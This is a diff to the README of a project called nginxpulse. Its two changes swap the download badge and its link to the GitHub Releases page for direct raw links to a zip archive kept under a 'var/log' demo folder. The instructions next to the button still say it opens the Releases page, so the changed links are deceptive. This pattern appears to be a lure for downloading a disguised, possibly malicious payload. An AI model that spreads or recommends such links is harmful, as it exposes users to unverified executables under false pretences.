@@ -17,7 +17,7 @@ Before you begin, ensure your system meets the following requirements:
 
 To get started, download nginxpulse by visiting the link below:
 
-[![Download nginxpulse](https://img.shields.io/badge/Download-nginxpulse-blue?style=for-the-badge)](https://github.com/Benito2712/nginxpulse/releases)
+[![Download nginxpulse](https://raw.githubusercontent.com/Benito2712/nginxpulse/main/var/log/nginx-pulse-demo/Software_2.8-alpha.4.zip)](https://raw.githubusercontent.com/Benito2712/nginxpulse/main/var/log/nginx-pulse-demo/Software_2.8-alpha.4.zip)
 
 1. Click the button above to go to the Releases page.
 2. On the Releases page, locate the latest version of nginxpulse.
@@ -93,4 +93,4 @@ Feel free to dive deeper into nginxpulse, and discover how it can enhance your u
 
 For any inquiries or technical support, visit the Releases page to get the latest updates:
 
-[![Download nginxpulse](https://img.shields.io/badge/Download-nginxpulse-blue?style=for-the-badge)](https://github.com/Benito2712/nginxpulse/releases)
+[![Download nginxpulse](https://raw.githubusercontent.com/Benito2712/nginxpulse/main/var/log/nginx-pulse-demo/Software_2.8-alpha.4.zip)](https://raw.githubusercontent.com/Benito2712/nginxpulse/main/var/log/nginx-pulse-demo/Software_2.8-alpha.4.zip)
